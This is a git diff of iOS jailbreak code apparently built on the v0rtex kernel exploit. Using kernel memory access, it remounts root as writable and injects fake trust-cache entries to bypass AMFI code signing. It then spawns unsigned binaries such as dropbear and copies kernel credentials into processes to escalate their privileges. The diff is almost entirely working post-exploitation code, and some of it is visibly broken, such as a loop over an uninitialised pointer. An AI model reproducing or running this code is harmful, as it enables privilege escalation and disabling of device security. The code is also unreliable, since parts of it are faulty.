@@ -67,11 +67,11 @@ kptr_t kslide;
     [self writeText:@"exploit succeeded!"];
     
     // Do things?
-    extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
+    /*extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
     uint32_t magic = 0;
     mach_vm_size_t sz = sizeof(magic);
     ret = mach_vm_read_overwrite(tfp0, 0xfffffff007004000 + kslide, sizeof(magic), (mach_vm_address_t)&magic, &sz);
-    LOG("mach_vm_read_overwrite: %x, %s", magic, mach_error_string(ret));
+    LOG("mach_vm_read_overwrite: %x, %s", magic, mach_error_string(ret));*/
     
     // Remount '/' as r/w
     int remountOutput = mount_root(tfp0, kslide);
@@ -82,30 +82,33 @@ kptr_t kslide;
     }
     [self writeText:@"remounted '/' as r/w"];
     
-    
     // Check we have '/' access
     bool rootAccess = can_write_root();
     [self writeText:[NSString stringWithFormat:@"can write to root: %@", rootAccess ? @"yes" : @"no"]];
     LOG("has root access: %s", rootAccess ? "yes" : "no");
     
+    // get kern proc
+//    uint64_t kern_proc = 0;
+//    uint64_t proc = rk64(tfp0, find_allproc());
+//    while (proc) {
+//        uint32_t pid = (uint32_t)rk32_via_tfp0(tfp0, proc + 0x10);
+//        char name[40] = {0};
+//        printf("name: %s \n", name);
+//
+//        if (pid == 0) {
+//            kern_proc = proc;
+//        }
+//        proc = rk64(tfp0, proc);
+//    }
+    
+//    printf("found kern_proc at: 0x%016llx \n", kern_proc);
+    
+    // get kern creds
+//    uint64_t kern_ucred = rk64(tfp0, kern_proc + 0x100);
     
     // dink amfi
-    
     int kern = init_kernel(tfp0, kslide + 0xFFFFFFF007004000, NULL);
     printf("init_kernel: %d \n", kern);
-    
-    uint64_t trust_chain = find_trustcache();
-    uint64_t amficache = find_amficache();
-    
-    term_kernel();
-    
-    printf("trust_chain val: %llu \n", trust_chain);
-    printf("amficache val: %llu \n", amficache);
-    
-    printf("first four values of amficache: %08x \n", rk32_via_tfp0(tfp0, amficache));
-    printf("trust cache at: %016llx \n", rk64(tfp0, trust_chain));
-    
-    printf("trust_chain = 0x%llx \n", trust_chain);
     
     mkdir("/var/v0rtex_test", 0777);
     [self writeText:@"spawning dropbear"];
@@ -127,57 +130,21 @@ kptr_t kslide;
     chmod("/var/v0rtex_test/test_fsigned", 0777);
     chmod("/var/v0rtex_test/tar", 0777);
     
-    typedef char hash_t [20];
-    
-    struct trust_chain {
-        uint64_t next;
-        unsigned char uuid[16];
-        unsigned int count;
-        hash_t hash[3];
-    };
-    struct trust_chain fake_chain;
-    
-    fake_chain.next = rk64(tfp0, trust_chain);
-    *(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
-    *(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
-    fake_chain.count = 3;
-    
-    uint8_t *hash = getSHA256(getCodeDirectory("/var/v0rtex_test/dropbear"));
-    //uint8_t *hash2 = getSHA256(getCodeDirectory("/var/v0rtex_test/launchctl"));
-    uint8_t *hash3 = getSHA256(getCodeDirectory("/var/v0rtex_test/test_fsigned"));
-    uint8_t *hash4 = getSHA256(getCodeDirectory("/var/v0rtex_test/tar"));
-    
-    memmove(fake_chain.hash[0], hash, 20);
-    //memmove(fake_chain.hash[1], hash2, 20);
-    memmove(fake_chain.hash[1], hash3, 20);
-    memmove(fake_chain.hash[2], hash4, 20);
-    
-    free(hash);
-    //free(hash2);
-    free(hash3);
-    free(hash4);
-    
-    uint64_t kernel_trust = 0;
-    int allo = mach_vm_allocate(tfp0, &kernel_trust, sizeof(fake_chain), VM_FLAGS_ANYWHERE);
-    printf("got %d from alloc, addy: %llu \n", allo, kernel_trust);
-    
-    wk32(tfp0, kernel_trust, &fake_chain);
-    wk32(tfp0, trust_chain, kernel_trust);
-    
-    [self writeText:@"fuck amfi"];
+//    inject_trust("/var/v0rtex_test/tar");
     
     char path[200];
     strcpy(path, bundle_path());
     strcat(path, "/tar");
     printf("full path: %s \n", path);
     chmod(path, 0777);
-    int launch1 = execprog(path, NULL);
-    printf("launchctl ONE = %d \n", launch1);
+    inject_trust(path);
+    int launch1 = execprog(0, path, NULL);
+    printf("launchctl %s = %d \n", path, launch1);
     
     // spawn dropbear
-    int launch = execprog("/var/v0rtex_test/launchctl", (const char **)&(const char*[]){ "/var/v0rtex_test/launchctl", "load", "/var/v0rtex_test/dropbear", NULL });
+    // int launch = execprog("/var/v0rtex_test/launchctl", (const char **)&(const char*[]){ "/var/v0rtex_test/launchctl", "load", "/var/v0rtex_test/dropbear", NULL });
     //int launch = launchctl_load_cmd("/var/v0rtex_test/dropbear.plist", 1, 1, 0);
-    printf("launchctl = %d \n", launch);
+    // printf("launchctl = %d \n", launch);
     
     // Done.
     [self writeText:@""];
@@ -215,13 +182,13 @@ void inject_trust(const char *path) {
     
     uint64_t kernel_trust = 0;
     mach_vm_allocate(tfp0, &kernel_trust, sizeof(fake_chain), VM_FLAGS_ANYWHERE);
-    wk32(tfp0, kernel_trust, &fake_chain);
     
-    wk32(tfp0, trust_cache, kernel_trust);
+    wk64(tfp0, kernel_trust, &fake_chain);
+    wk64(tfp0, trust_cache, kernel_trust);
 }
 
-uint32_t swap_uint32( uint32_t val ) {
-    val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF );
+uint32_t swap_uint32(uint32_t val) {
+    val = ((val << 8) & 0xFF00FF00) | ((val >> 8) & 0xFF00FF);
     return (val << 16) | (val >> 16);
 }
 
@@ -278,10 +245,9 @@ uint8_t *getCodeDirectory(const char* name) {
   }
   return NULL;
 }
-                              
-int execprog(const char *prog, const char* args[]) {
-    int rv;
-    
+
+// creds to stek on this one
+int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
     if (args == NULL) {
         args = (const char **)&(const char*[]){ prog, NULL };
     }
@@ -295,6 +261,7 @@ int execprog(const char *prog, const char* args[]) {
     }
     printf("] to file %s\n", logfile);
     
+    int rv;
     posix_spawn_file_actions_t child_fd_actions;
     if ((rv = posix_spawn_file_actions_init (&child_fd_actions))) {
         perror ("posix_spawn_file_actions_init");
@@ -316,30 +283,11 @@ int execprog(const char *prog, const char* args[]) {
         return rv;
     }
     
-    #define    CS_VALID        0x0000001    /* dynamically valid */
-    #define CS_ADHOC        0x0000002    /* ad hoc signed */
-    #define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
-    #define CS_INSTALLER        0x0000008    /* has installer entitlement */
-    
-    #define    CS_HARD            0x0000100    /* don't load invalid pages */
-    #define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
-    #define CS_CHECK_EXPIRATION    0x0000400    /* force expiration checking */
-    #define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */
-    #define CS_ENFORCEMENT        0x0001000    /* require enforcement */
-    #define CS_REQUIRE_LV        0x0002000    /* require library validation */
-    #define CS_ENTITLEMENTS_VALIDATED    0x0004000
-    
-    #define    CS_ALLOWED_MACHO    0x00ffffe
-    
-    #define CS_EXEC_SET_HARD    0x0100000    /* set CS_HARD on any exec'ed process */
-    #define CS_EXEC_SET_KILL    0x0200000    /* set CS_KILL on any exec'ed process */
-    #define CS_EXEC_SET_ENFORCEMENT    0x0400000    /* set CS_ENFORCEMENT on any exec'ed process */
-    #define CS_EXEC_SET_INSTALLER    0x0800000    /* set CS_INSTALLER on any exec'ed process */
-    
-    #define CS_KILLED        0x1000000    /* was killed by kernel for invalidity */
-    #define CS_DYLD_PLATFORM    0x2000000    /* dyld used to load this is a platform binary */
-    #define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */
-    #define CS_PLATFORM_PATH    0x8000000    /* platform binary by the fact of path (osx only) */
+    #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
+    #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
+    #define CS_HARD                 0x0000100    /* don't load invalid pages       */
+    #define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
+    #define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
     
     /*
      1. read 8 bytes from proc+0x100 into self_ucred
@@ -347,35 +295,46 @@ int execprog(const char *prog, const char* args[]) {
      3. write 12 zeros to self_ucred + 0x18
      */
     
-    /*
-    uint64_t proc = rk64(tfp0, 0xfffffff0075f0178 + kslide);
-    int tries = 3;
-    while (tries-- > 0) {
-        sleep(1);
-        while (proc) {
-            uint32_t pid = rk32_via_tfp0(tfp0, proc + 0x10);
-            if (pid == pd) {
-                uint32_t csflags = rk32_via_tfp0(tfp0, proc + 0x2a8);
-                csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
-                wk32(tfp0, proc + 0x2a8, csflags);
-                printf("empower\n");
-                tries = 0;
-                break;
+    if (kern_ucred != 0) {
+        int tries = 3;
+        while (tries-- > 0) {
+            sleep(1);
+            //uint64_t proc = rk64(tfp0, find_allproc());
+            uint64_t proc;
+            while (proc) {
+                uint32_t pid = rk32(tfp0, proc + 0x10);
+                if (pid == pd) {
+                    uint32_t csflags = rk32(tfp0, proc + 0x2a8);
+                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
+                    wk32(tfp0, proc + 0x2a8, csflags);
+                    printf("empower\n");
+                    tries = 0;
+                    
+                    uint64_t self_ucred = rk32(tfp0, proc + 0x100);
+                    
+                    uint64_t selfcred_temp = rk32(tfp0, kern_ucred + 0x78);
+                    wk32(tfp0, self_ucred + 0x78, selfcred_temp);
+                    
+                    for (int i = 0; i < 12; i++) {
+                        wk32(tfp0, self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
+                    }
+                    
+                    printf("gave elevated perms to pid %d \n", pid);
+                    
+                    // original stuff, rewritten above using v0rtex stuff
+                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
+                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
+                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
+                    break;
+                }
+                proc = rk64(tfp0, proc);
             }
-            proc = rk64(tfp0, proc);
         }
     }
-     */
     
     int status;
     waitpid(pd, &status, 0);
     printf("'%s' exited with %d (sig %d)\n", prog, WEXITSTATUS(status), WTERMSIG(status));
-    
-    //if (proc) {
-    //    printf("writing creds");
-    //    int64_t c_cred = rk64(tfp0, kern_ucred);
-    //    wk32(tfp0, proc + 0x100, c_cred);
-    //}
     
     char buf[65] = {0};
     int fd = open(logfile, O_RDONLY);
